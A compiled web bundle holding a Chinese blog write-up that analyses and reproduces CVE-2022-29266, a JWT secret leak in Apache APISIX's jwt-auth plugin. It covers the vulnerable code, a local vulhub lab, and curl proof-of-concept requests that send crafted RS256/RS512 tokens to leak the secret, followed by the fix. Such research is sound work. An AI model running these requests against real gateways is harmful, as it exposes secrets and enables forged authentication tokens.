(window.webpackJsonp=window.webpackJsonp||[]).push([[9],{800:function(s,a,t){"use strict";t.r(a);var e={mounted:function(){this.$page.lastUpdated="2022年4月30日"}},n=t(112),r=Object(n.a)(e,(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("center",[t("h1",[s._v("APISIX CVE-2022-29266 漏洞分析与复现")])]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("在 2.13.1 之前的 Apache APISIX 中，由于 APISIX 中的 jwt-auth 插件依赖于 lua-resty-jwt 库，而在 lua-resty-jwt 库返回的错误信息中可能会包含 JWT 的 sceret 值，因此对于开启了 jwt-auth 插件的 APISIX 存在 JWT sceret 的泄露，从而造成对 JWT 的伪造风险。")]),s._v(" "),t("h2",{attrs:{id:"影响版本"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[s._v("#")]),s._v(" 影响版本")]),s._v(" "),t("p",[s._v("低于 2.13.1 的 Apache APISIX 全部版本。")]),s._v(" "),t("h2",{attrs:{id:"前要介绍"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#前要介绍"}},[s._v("#")]),s._v(" 前要介绍")]),s._v(" "),t("h3",{attrs:{id:"apisix"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#apisix"}},[s._v("#")]),s._v(" APISIX")]),s._v(" "),t("p",[s._v("Apache APISIX 是一个由 Apache 基金会孵化的一个开源的云原生 API 网关，具有高性能、可扩展的特点，与传统的 API 网关相比，APISIX 是通过插件的形式来提供负载均衡、日志记录、身份鉴权、流量控制等功能。")]),s._v(" "),t("h3",{attrs:{id:"jwt"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#jwt"}},[s._v("#")]),s._v(" JWT")]),s._v(" "),t("p",[s._v("JSON Web Token 缩写成 JWT，常被用于和服务器的认证场景中，这一点有点类似于 Cookie 里的 Session id")]),s._v(" "),t("p",[s._v("JWT 支持 HS256、RS256、RS512 等等算法，JWT 由三部分构成，分别为 Header（头部）、Payload（负载）、Signature（签名），三者以小数点分割。")]),s._v(" "),t("p",[s._v("JWT 的第三部分 Signature 是对 Header 和 Payload 部分的签名，起到防止数据篡改的作用，如果知道了 Signature 内容，那么就可以伪造 JWT 了。")]),s._v(" "),t("p",[s._v("JWT 的格式类似于这样：")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("Header.Payload.Signature\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("实际遇到的 JWT 一般是这种样子")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"漏洞分析"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞分析"}},[s._v("#")]),s._v(" 漏洞分析")]),s._v(" "),t("p",[s._v("首先根据官方仓库的漏洞修复代码定位到 /apisix/plugins/jwt-auth.lua 文件的第 364 行，如果 JWT 无效则在 return 返回 401 并给出无效的原因，即 jwt_obj.reason")]),s._v(" "),t("img",{attrs:{width:"800",src:"/img/1651303753.png"}}),s._v(" "),t("p",[s._v("接着在 lua-resty-jwt 库中找到 lib/resty/jwt.lua 文件，在 jwt.lua 文件的 782 行中，可以看到有个 jwt_obj.reason 中包含了 secret，这里代码的意思是说，如果程序执行正常就返回 secret 的值，否则就返回具体的异常信息。")]),s._v(" "),t("blockquote",[t("p",[s._v(".. 表示字符串拼接，即把后面代码的值拼接到字符串中")]),s._v(" "),t("p",[s._v("err and err or secret 所表示的意思是：如果 err 为 nil，则返回 secret 的值，否则返回 err")])]),s._v(" "),t("img",{attrs:{width:"1000",src:"/img/1651303910.png"}}),s._v(" "),t("p",[s._v("那么接下来要做的就是怎么样构建 payload 才能让代码进入到第 782 行，从而让 jwt_obj.reason 返回我们想要的 secret 呢？那么就要看看 782 行上面的代码。")]),s._v(" "),t("img",{attrs:{width:"1000",src:"/img/1651303984.png"}}),s._v(" "),t("p",[s._v("通过上图可以看到，如果想执行到第 782 行，需要满足四个条件，分别如下：")]),s._v(" "),t("ul",[t("li",[s._v("756 行，JWT 的算法需要是 RS256 或者 RS512")]),s._v(" "),t("li",[s._v("758 行，trusted_certs_file 值需要为 nil")]),s._v(" "),t("li",[s._v("774 行，secret 值不能为 nil")]),s._v(" "),t("li",[s._v("781 行，cert 的值需要为 nil 或者 false")])]),s._v(" "),t("blockquote",[t("p",[s._v("~= 表示不等于")])]),s._v(" "),t("p",[s._v("首先，第一个条件，JWT 的算法需要是 RS256 或者 RS512，这个很简单，只需要 JWT 的 header 部分的 alg 参数为 RS256 或者 RS512 即可。")]),s._v(" "),t("p",[s._v("接着，第二个条件，trusted_certs_file 即信任证书文件，APISIX 默认算法是 HS256，而 HS256 和 HS512 不支持这种证书文件的方式，因此只要我们使用 HS256  或者 HS512 算法就行了。")]),s._v(" "),t("p",[s._v("然后，第三个条件，secret 值不能为 nil，当 APISIX 使用 jwt-auth 插件的时候，如果使用的默认算法，就需要指定 secret 的值，那么这个 secret 的值就不会是 nil 了。")]),s._v(" "),t("p",[s._v("最后，第四个条件，cert 的值需要为 nil 或者 false，在 776 行至 779 行的代码中，可以看到会判断 secret 中有没有 CERTIFICATE 和 PUBLIC KEY，如果有那么 cert 就不会是 nil 了，那么也就是说，只要 secret 中没有 CERTIFICATE 和 PUBLIC KEY，代码就会执行到第 782 行，并且返回 secret 的值。")]),s._v(" "),t("p",[s._v("所以分析到这里就基本清楚了，漏洞利用的前提有以下三个：")]),s._v(" "),t("ul",[t("li",[s._v("APISIX 需要开启 jwt-auth 插件")]),s._v(" "),t("li",[s._v("jwt-auth 插件算法需要是 HS256 或者 HS512")]),s._v(" "),t("li",[s._v("secret 的值中不能包含 CERTIFICATE 和 PUBLIC KEY 字符串")])]),s._v(" "),t("p",[s._v("如果满足了这三个前提，当我们利用 RS256 或者 RS512 的 JWT 值发送给 APISIX 的时候，我们就会得到 jwt-auth 中的 secret，从而实现 JWT 伪造了。")]),s._v(" "),t("p",[s._v("那么下面就开始搭环境，复现，顺便验证下漏洞分析的正确性。")]),s._v(" "),t("h2",{attrs:{id:"环境搭建"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),t("p",[s._v("在 VulnHub 上有 APISIX CVE-2020-13945 漏洞的靶场，APISIX 版本为 2.11.0，因此我们可以直接用这个靶场作为 CVE-2022-29266 的靶场进行复现。")]),s._v(" "),t("p",[s._v("环境搭建命令：")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("git")]),s._v(" clone https://github.com/vulhub/vulhub.git\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" vulhub/apisix/CVE-2020-13945\n"),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker-compose")]),s._v(" up -d\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("访问 http://your-ip:9080 地址即可")]),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("p",[s._v("首先需要一个 RS256 算法的 JWT 值，这里为了方便直接在 "),t("a",{attrs:{href:"https://jwt.io/",target:"_blank",rel:"noopener noreferrer"}},[s._v("jwt.io"),t("OutboundLink")],1),s._v(" 中生成，只需要将算法改为 RS256，Payload 改为以下内容即可，注意 Payload 中的 key 值需要和下面创建 consumer 对象时的 key 一致。")]),s._v(" "),t("div",{staticClass:"language-json line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-json"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),t("span",{pre:!0,attrs:{class:"token property"}},[s._v('"key"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"rs-key"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("img",{attrs:{width:"1000",src:"/img/1651304025.png"}}),s._v(" "),t("p",[s._v("生成的 JWT 值如下：")]),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("接着创建一个 consumer 对象，并设置 jwt-auth 的值，默认是 HS256 算法，secret  值为 teamssix-secret-key")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://127.0.0.1:9080/apisix/admin/consumers -H "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'")]),s._v(" -X PUT -d "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('\'\n{\n"username": "jack",\n"plugins": {\n"jwt-auth": {\n"key": "rs-key",\n"secret": "teamssix-secret-key"\n}\n}\n}\'')]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br")])]),t("p",[s._v("然后再创建 Route 对象，并开启 jwt-auth 插件")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://127.0.0.1:9080/apisix/admin/routes/1 -H "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'")]),s._v(" -X PUT -d "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('\'\n{\n"methods": ["GET"],\n"uri": "/index.html",\n"plugins": {\n"jwt-auth": {}\n},\n"upstream": {\n"type": "roundrobin",\n"nodes": {\n"0.0.0.0:80": 1\n}\n}\n}\'')]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br")])]),t("p",[s._v("这时其实漏洞环境才算搭好，接下来就可以开始发送 Payload 了。")]),s._v(" "),t("p",[s._v("将刚才由 RS256 算法生成的 JWT 值发送给 HS256 算法验证的路由，这样就可以获得刚才设置的 secret 值了。")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://127.0.0.1:9080/index.html?jwt"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg -i\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("img",{attrs:{width:"1000",src:"/img/1651304089.png"}}),s._v(" "),t("p",[s._v("当我们拿到这个 sceret 值后，就可以伪造 JWT Token 了。")]),s._v(" "),t("p",[s._v("那么根据上面的漏洞分析，这里如果使用 RS512 算法应该也能触发这个漏洞，在 jwt.io 上生成 RS512 的 JWT 值如下：")]),s._v(" "),t("img",{attrs:{width:"1000",src:"/img/1651304149.png"}}),s._v(" "),t("div",{staticClass:"language-plain line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-plain"}},[t("code",[s._v("eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.bMCMT2wCP8X6duvDDuaR232ae3XkA3d2g-FKvI-D73sk8nTRWZEfovoh_FFi5PquyC81J5i5bED-rh1RMuDHlJVMYDKTP-EPdoRxugBdCCq9iEL3A004PTQM21rWLcPe1SOqp2Qvcf41iH-5r5Zs5cuAraQm4qFyhooCziSIPNnbyb8VUMx6k7fGS-WIBMVti-SjG5dEGLwAckCjc_XYMPrHqMRFYU_sB6jY05xX_9u5PFnuOQiu-q3c7gZLHdVSzHeYQGct-nrjcrM2VHvdkMIwMOr25UMhu200HFDhpLXuWpic7WC-rtztTZOtZne7UZ4s6MlnJavZiXWEq3Ovew\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("利用 curl 访问")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://127.0.0.1:9080/index.html?jwt"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.bMCMT2wCP8X6duvDDuaR232ae3XkA3d2g-FKvI-D73sk8nTRWZEfovoh_FFi5PquyC81J5i5bED-rh1RMuDHlJVMYDKTP-EPdoRxugBdCCq9iEL3A004PTQM21rWLcPe1SOqp2Qvcf41iH-5r5Zs5cuAraQm4qFyhooCziSIPNnbyb8VUMx6k7fGS-WIBMVti-SjG5dEGLwAckCjc_XYMPrHqMRFYU_sB6jY05xX_9u5PFnuOQiu-q3c7gZLHdVSzHeYQGct-nrjcrM2VHvdkMIwMOr25UMhu200HFDhpLXuWpic7WC-rtztTZOtZne7UZ4s6MlnJavZiXWEq3Ovew -i\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("img",{attrs:{width:"1000",src:"/img/1651304176.png"}}),s._v(" "),t("p",[s._v("果然使用 RS512 算法同样可以触发，说明漏洞分析的没毛病。")]),s._v(" "),t("p",[s._v("接着看看如果 secret 中包含了 CERTIFICATE 和 PUBLIC KEY 字符串，会返回什么。")]),s._v(" "),t("p",[s._v("重新开一个环境后，创建一个 consumer 对象，这次 secret 设置为 teamssix-CERTIFICATE")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://127.0.0.1:9080/apisix/admin/consumers -H "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'")]),s._v(" -X PUT -d "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('\'\n{\n"username": "jack",\n"plugins": {\n"jwt-auth": {\n"key": "rs-key",\n"secret": "teamssix-CERTIFICATE"\n}\n}\n}\'')]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br")])]),t("p",[s._v("创建 Route 对象，并开启 jwt-auth 插件")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://127.0.0.1:9080/apisix/admin/routes/1 -H "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'")]),s._v(" -X PUT -d "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('\'\n{\n"methods": ["GET"],\n"uri": "/index.html",\n"plugins": {\n"jwt-auth": {}\n},\n"upstream": {\n"type": "roundrobin",\n"nodes": {\n"0.0.0.0:80": 1\n}\n}\n}\'')]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br")])]),t("p",[s._v("触发漏洞")]),s._v(" "),t("div",{staticClass:"language-shell line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-shell"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://127.0.0.1:9080/index.html?jwt"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg -i\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("img",{attrs:{width:"1000",src:"/img/1651304251.png"}}),s._v(" "),t("p",[s._v("可以看到，这里并没有返回刚才设置的 secret 值，而是返回了 not enough data，即 err 的信息，这表明此时 cert 的值已经不为 nil 了，再次证明了上面的分析。")]),s._v(" "),t("h2",{attrs:{id:"漏洞代码修复"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞代码修复"}},[s._v("#")]),s._v(" 漏洞代码修复")]),s._v(" "),t("p",[s._v("观察 APISIX 的漏洞修复信息，可以看到对 jwt-auth.lua 文件的第 364 和 395 行进行了修改，修复信息地址：https://github.com/apache/apisix/commit/61a48a2524a86f2fada90e8196e147538842db89")]),s._v(" "),t("img",{attrs:{width:"1000",src:"/img/1651304278.png"}}),s._v(" "),t("p",[s._v("这里是将原来的直接返回报错原因改成了返回 JWT token invalid 和 JWT token verify failed 的文本信息。")]),s._v(" "),t("h2",{attrs:{id:"修复方案"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#修复方案"}},[s._v("#")]),s._v(" 修复方案")]),s._v(" "),t("ul",[t("li",[s._v("升级至 Apache APISIX 2.13.1 及以上版本")]),s._v(" "),t("li",[s._v("安装补丁包，补丁包地址详见：https://apisix.apache.org/zh/blog/2022/04/20/cve-2022-29266")])]),s._v(" "),t("h2",{attrs:{id:"总结"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[s._v("#")]),s._v(" 总结")]),s._v(" "),t("p",[s._v("这个漏洞最终造成的风险是 JWT 伪造，但前提是需要对方的 APISIX 开启了 jwt-auth 插件才行，并且如果有细心的读者可能会发现，当我们构造 RS256 算法的 JWT 时，需要先知道目标 APISIX consumer 对象的 key 值，因此这个漏洞利用起来还是有一定限制的。")]),s._v(" "),t("p",[s._v("这篇文章也已经同步到了 T Wiki 云安全知识文库中，文库地址："),t("a",{attrs:{href:"https://wiki.teamssix.com/",target:"_blank",rel:"noopener noreferrer"}},[s._v("wiki.teamssix.com"),t("OutboundLink")],1),s._v("，文库中都是云安全相关的文章，并且有很多来自大家共同贡献的云安全资源，也非常欢迎你一起来补充 T Wiki 云安全知识文库。")]),s._v(" "),t("blockquote",[t("p",[s._v("由于笔者个人的技术水平有限，因此如果文章中有什么不正确的地方，欢迎在留言处指正，不胜感激。")])]),s._v(" "),t("p",[s._v("参考链接：")]),s._v(" "),t("p",[s._v("https://t.zsxq.com/mqnAeeY")]),s._v(" "),t("p",[s._v("https://www.jianshu.com/p/1b2c56687d0d")]),s._v(" "),t("p",[s._v("https://teamssix.com/211214-175948.html")]),s._v(" "),t("p",[s._v("https://apisix.apache.org/blog/2022/04/20/cve-2022-29266")]),s._v(" "),t("p",[s._v("https://zone.huoxian.cn/d/1130-apache-apisix-jwt-cve-2022-29266")]),s._v(" "),t("Vssue")],1)}),[],!1,null,null,null);a.default=r.exports}}]);